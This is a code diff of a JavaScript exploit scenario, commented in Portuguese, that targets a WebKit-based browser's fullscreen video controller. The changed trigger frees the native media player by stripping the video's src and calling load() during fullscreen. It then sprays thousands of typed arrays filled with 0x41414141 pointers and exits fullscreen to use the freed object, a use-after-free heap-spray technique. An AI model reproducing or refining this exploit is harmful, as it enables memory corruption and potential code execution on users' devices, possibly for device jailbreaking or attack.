@@ -1,21 +1,23 @@
 /**
- * CENÁRIO: VIDEO_FULLSCREEN_REMOVE (Teardown Race)
- * Alvo: Race condition entre webkitExitFullscreen e video.remove()
+ * CENÁRIO: VIDEO_FULLSCREEN_SRC_UAF
+ * Alvo: FullscreenVideoController + MediaPlayerPrivate
  */
 
 export default {
-    id:       'VIDEO_FULLSCREEN_REMOVE',
+    id:       'VIDEO_FULLSCREEN_SRC_UAF',
     category: 'Media',
     risk:     'CRITICAL',
-    description: 'Inverte a lógica para evitar o Soft Brick: Inicia a saída do Fullscreen (exit) ' +
-                 'e destrói o objeto (remove + spray) no milissegundo exato em que o Manx tenta limpar a tela.',
+    description: 'Evita o GPU Hang (Soft Brick) mantendo o DOM intacto, mas destrói ' +
+                 'o MediaPlayerPrivate C++ removendo o src e forçando um load() ' +
+                 'durante o Fullscreen, seguido do Spray de 0x41414141.',
 
     setup: async function() {
         this.container = document.createElement('div');
         document.body.appendChild(this.container);
+        
         this.video = document.createElement('video');
         this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
-        this.video.controls = true; // Necessário para algumas lógicas nativas
+        this.video.controls = true;
         this.container.appendChild(this.video);
 
         // O nosso payload malicioso (Ponteiros 0x41414141 = "AAAA")
@@ -33,31 +35,35 @@ export default {
 
     trigger: async function() {
         try {
-            // 1. Entramos em Fullscreen nativo
+            // 1. Entramos em Fullscreen nativo (Manx)
             if (this.video.webkitEnterFullscreen) {
                 this.video.webkitEnterFullscreen();
             } else if (this.video.webkitRequestFullscreen) {
                 this.video.webkitRequestFullscreen();
             }
             
-            await new Promise(r => setTimeout(r, 200)); // Aguarda estabilizar
+            // Aguardamos a transição gráfica estabilizar
+            await new Promise(r => setTimeout(r, 400)); 
 
-            // 2. INICIA A SAÍDA (O Manx começa a desconstruir a tela)
-            if (document.webkitExitFullscreen) {
-                document.webkitExitFullscreen();
-            } else if (this.video.webkitExitFullscreen) {
-                this.video.webkitExitFullscreen();
-            }
+            // 2. A MÁGICA: Em vez de remover o elemento do DOM, arrancamos o "motor" do vídeo!
+            // Isso força o WebKit a deletar o MediaPlayerPrivate antigo.
+            this.video.removeAttribute('src');
+            this.video.load(); 
 
-            // 3. A CORRIDA (Race): Destruímos o vídeo ANTES do Manx terminar a saída!
-            this.video.remove();
-
-            // 4. SPRAY: Preenchemos a memória a jato
+            // 3. SPRAY: Preenchemos o buraco do player antigo com os nossos ponteiros
             this.spray = [];
             for (let i = 0; i < 5000; i++) {
                 let arr = new Uint32Array(256);
                 arr.set(this.sprayPayload);
                 this.spray.push(arr);
+            }
+
+            // 4. USE: Dizemos ao controlador para sair. 
+            // O controlador ainda aponta para o MediaPlayerPrivate que acabámos de destruir no passo 2!
+            if (document.webkitExitFullscreen) {
+                document.webkitExitFullscreen();
+            } else if (this.video.webkitExitFullscreen) {
+                this.video.webkitExitFullscreen();
             }
 
         } catch(e) {}
@@ -72,5 +78,6 @@ export default {
     cleanup: function() {
         try { this.container.remove(); } catch(e) {}
         this.spray = null;
+        this.video = null;
     }
 };
